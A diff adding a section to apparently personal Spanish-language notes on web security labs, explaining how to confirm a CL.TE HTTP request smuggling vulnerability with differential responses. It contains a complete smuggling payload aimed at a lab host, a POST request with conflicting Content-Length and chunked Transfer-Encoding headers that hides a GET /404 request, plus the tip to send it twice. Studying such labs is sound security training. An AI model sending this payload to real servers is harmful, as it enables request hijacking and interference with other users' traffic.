@@ -136,6 +136,29 @@ x=1
 Recuerda que los salto de liena son dos caracteres por eso es 4 y en el caso del final son 4 caracteres \r\n\r\n. 
 Referencias 
 
+# HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
+
+Para este laboratorio se intenta inyectar por asi decirlo mas bien que el servidor interprete una peticion que no deberia
+
+```
+
+POST / HTTP/1.1
+Host: your-lab-id.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+
+```
+
+Como nota se agarra la primera peticon la que se hace a la raiz y se envia 2 veces.
+
+
+
 
 
 
